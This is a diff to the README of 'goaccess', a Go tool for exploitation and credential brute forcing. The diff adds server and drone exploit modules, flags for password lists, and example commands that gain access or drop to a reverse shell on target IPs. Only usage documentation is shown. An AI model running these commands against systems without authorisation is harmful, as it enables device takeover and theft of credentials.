@@ -5,8 +5,8 @@ It provides a CLI tool with three operational modes (`identify`, `scan`, `access
 
 ## Features
 
-- **142 exploit modules** covering 43 vendors (D-Link, Cisco, Netgear, TP-Link, MikroTik, Huawei, and more)
-- **170 credential modules** with vendor-specific default wordlists and brute-force capabilities
+- **174 exploit modules** covering 55 vendors (D-Link, Cisco, Netgear, TP-Link, MikroTik, Huawei, WordPress, Tomcat, Jenkins, JBoss, SAP, and more)
+- **184 credential modules** with vendor-specific default wordlists and brute-force capabilities
 - **5 password generators** for MAC/serial-derived credentials (D-Link, TP-Link, Thomson, NETGEAR)
 - **Pure Go protocol clients**: HTTP/HTTPS, TCP, UDP, SSH, Telnet, FTP, SNMP
 - **Zero CGO dependencies**: all protocols use pure Go libraries (`golang.org/x/crypto/ssh`, `github.com/jlaffaye/ftp`, `github.com/gosnmp/gosnmp`)
@@ -75,17 +75,21 @@ goaccess scan 192.168.1.1
 goaccess scan 192.168.1.1 --vendor dlink --type router
 goaccess scan 192.168.1.1 --threads 32 --timeout 10
 goaccess scan 192.168.1.1 --skip-creds
+goaccess scan 192.168.1.1 --username admin --password password --vendor wordpress
 goaccess scan 192.168.1.1 --json --output results.json
 ```
 
 | Flag | Default | Description |
 |------|---------|-------------|
 | `--vendor` | — | Filter exploits by vendor |
-| `--type` | — | Filter by device type (router, camera, misc) |
+| `--type` | — | Filter by device type (router, camera, drone, server, misc) |
 | `--threads` | 8 | Number of parallel threads |
 | `--timeout` | 8 | Timeout in seconds |
 | `--skip-creds` | false | Skip credential checks |
 | `--skip-exploits` | false | Skip exploit checks |
+| `--username` | admin | Username for authenticated takeover |
+| `--password` | — | Password for authenticated takeover |
+| `--password-list` | — | File of passwords to try with `--username` |
 | `--json` | false | Output as JSON (streams results) |
 | `--output` | — | Write JSON array to file |
 | `--verbose` | false | Verbose output |
@@ -100,6 +104,8 @@ goaccess access 192.168.1.1 --payload arm --listen :4444
 goaccess access 192.168.1.1 --shell
 goaccess access 192.168.1.1 --no-creds    # exploit only
 goaccess access 192.168.1.1 --no-exploit   # creds only
+goaccess access 192.168.1.1 --username admin --password password --vendor wordpress
+goaccess access 192.168.1.1 --username admin --password-list rockyou.txt
 ```
 
 | Flag | Default | Description |
@@ -111,6 +117,11 @@ goaccess access 192.168.1.1 --no-exploit   # creds only
 | `--shell` | false | Drop to interactive shell |
 | `--no-exploit` | false | Skip exploitation, creds only |
 | `--no-creds` | false | Skip credential checks |
+| `--vendor` | — | Filter exploits by vendor |
+| `--type` | — | Filter exploits by device type |
+| `--username` | admin | Username for authenticated takeover |
+| `--password` | — | Password for authenticated takeover |
+| `--password-list` | — | File of passwords to try with `--username` |
 | `--json` | false | Output as JSON |
 | `--output` | — | Write JSON output to file |
 | `--verbose` | false | Verbose output |
@@ -258,10 +269,12 @@ goaccess/
 ├── exploit/           # Global registry (Register, ByVendor, ByModel, Get)
 ├── scanner/           # Scan engine (Identify, Scan, Access with worker pool)
 ├── protocols/         # Pure Go clients: http, tcp, udp, ssh, telnet, ftp, snmp
-├── exploits/          # 142 exploit modules + 170 credential modules
+├── exploits/          # 174 exploit modules + 184 credential modules
 │   ├── generic/       # Heartbleed, Shellshock, RomPager, TCP-32764, GPON
 │   ├── routers/       # D-Link, Cisco, Netgear, TP-Link, MikroTik, ...
 │   ├── cameras/       # Brickcom, Grandstream, Honeywell, Siemens, ...
+│   ├── drones/        # DJI, Parrot, Tello, DB Power
+│   ├── servers/       # WordPress, Joomla, Drupal, Tomcat, Jenkins, SAP, Magento, ...
 │   └── misc/          # ASUS projector, Miele, WatchGuard, WePresent
 ├── shell/             # Reverse/bind shell handler + listener
 ├── payload/           # Pre-built multi-arch reverse shell binaries
@@ -269,7 +282,7 @@ goaccess/
 ├── oui/               # MAC OUI vendor database (23,798 entries)
 ├── ssh_keys/          # Known hardcoded SSH private keys (9 vendors)
 ├── parsers/           # Config file parsers for credential extraction
-├── libs/lzs/          # LZS decompression for ROM-0 exploits
+├── libs/              # lzs (ROM-0), sqlinject (SQLi engine), webapp (web app helpers)
 ├── report/            # Colorized CLI output + JSON formatting
 └── cmds/
     ├── goaccess/      # Main CLI binary
